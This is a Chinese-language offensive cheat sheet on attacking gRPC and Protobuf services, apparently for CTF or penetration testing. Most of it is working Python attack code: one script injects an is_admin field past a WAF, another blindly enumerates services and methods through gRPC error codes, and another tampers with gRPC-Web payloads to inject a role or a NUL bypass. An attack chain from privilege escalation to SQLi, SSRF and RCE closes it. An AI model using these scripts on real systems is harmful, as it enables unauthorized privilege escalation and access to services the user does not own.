# gRPC / Protobuf 攻击

## Protobuf 字段注入

Protobuf 不存字段名只存 field number。如果新增了特权字段 (field 4 = is_admin)，WAF 不知道这个 number，但服务端接受。

```python
# protobuf_field_inject.py — 二进制 Protobuf 字段注入
import struct

def encode_varint(value: int) -> bytes:
    """Protobuf varint 编码"""
    result = b""
    while value > 127:
        result += bytes([(value & 0x7F) | 0x80])
        value >>= 7
    result += bytes([value & 0x7F])
    return result

def inject_field(payload: bytes, field_number: int, wire_type: int,
                 value: bytes) -> bytes:
    """在 Protobuf message 中注入额外字段"""
    field_key = encode_varint((field_number << 3) | wire_type)
    return payload + field_key + value

# 使用: 在正常 Protobuf 请求后 append 特权字段
# 正常: field 1 (username) = "user", field 2 (password) = "pass"
# 注入: field 4 (is_admin\?"wire_type 0=varint) = 1 (true)
normal_msg = b""  # 从 Burp 抓取的正常 Protobuf 请求
injected = inject_field(normal_msg, field_number=4, wire_type=0,
                        value=encode_varint(1))  # is_admin = true
# → field 4 在后端新版本中存在，但 WAF 不理解
```

## gRPC 盲枚举

```python
# gRPC 即使禁用 reflection，不同状态返回不同 gRPC error code
# UNIMPLEMENTED → 服务存在但方法不存在
# NOT_FOUND → 服务不存在
# INVALID_ARGUMENT → 方法存在但参数错误

import requests, struct

GRPC_ERROR_CODES = {
    0: "OK",
    5: "NOT_FOUND",
    12: "UNIMPLEMENTED",
    3: "INVALID_ARGUMENT",
    7: "PERMISSION_DENIED",
    16: "UNAUTHENTICATED",
}

def blind_grpc_enum(target: str, port: int = 50051):
    """盲枚举 gRPC 服务和方法"""
    SERVICES = ["UserService", "AdminService", "FlagService",
                "AuthService", "ConfigService", "InternalService"]
    METHODS = ["GetUser", "GetAdmin", "GetFlag", "Login",
               "CreateUser", "DeleteUser", "UpdateConfig",
               "ListUsers", "GetSecret", "Execute"]

    for svc in SERVICES:
        for method in METHODS:
            # 构造 gRPC 请求 (HTTP/2 + Protobuf)
            # 简化: 发送 http://target:port/svc.FullName/Method
            r = requests.post(
                f"https://{target}:{port}/{svc}/{method}",
                headers={"Content-Type": "application/grpc"},
                data=b"\x00\x00\x00\x00\x00"  # 最小 gRPC frame
            )
            grpc_status = r.headers.get("grpc-status", "unknown")
            if grpc_status != "5":  # 不是 NOT_FOUND
                print(f"[!] {svc}/{method}: {grpc_status}")
```

## gRPC-Web Payload 修改

```python
# gRPC-Web 使用 Base64 编码的 Protobuf → 可直接解码修改
import base64

def decode_grpc_web(payload_b64: str) -> bytes:
    """解码 gRPC-Web payload"""
    return base64.b64decode(payload_b64)

def encode_grpc_web(data: bytes) -> str:
    return base64.b64encode(data).decode()

# 从 Burp 抓取 gRPC-Web 请求
captured = "CgVhZG1pbhIIdGVzdDEyMzQ="  # Base64 Protobuf
decoded = decode_grpc_web(captured)

# 修改字段 #1 (username) 从 "admin" 改为 "admin\x00" (NUL bypass)
# 或注入 field #3 (role) = "admin"
modified = inject_field(decoded, field_number=3, wire_type=2,
    value=b"\x05admin")  # wire_type=2 是 length-delimited

new_payload = encode_grpc_web(modified)
```

## Protoscope 工具集成

```bash
# Protoscope — Protobuf 可读格式
echo "CgVhZG1pbhIIdGVzdDEyMzQ=" | base64 -d | protoscope

# 输出: 1: {"admin"} 2: {"test1234"}
# 编辑 field 1 的值 → protoscope -schema schema.proto | base64

# 安装: go install github.com/protocolbuffers/protoscope/cmd/protoscope@latest
```

## 攻击链

```
gRPC reflection → 完整 schema → 发现 AdminService → 调用 → 提权
Blind gRPC enum → 发现 FlagService/GetFlag → 直接调用 → flag
Protobuf field injection → field 4 is_admin=true → 后端接受 → 权限提升
gRPC → SQLi/SSRF via Protobuf field → 后端查询 → RCE
gRPC-Web → decode → 修改 payload → re-encode → 绕过前端验证
```

## Evidence

记录: gRPC 服务/方法枚举结果、Protobuf 消息修改前后 hex diff、注入字段的 field number 和值、服务端响应差异
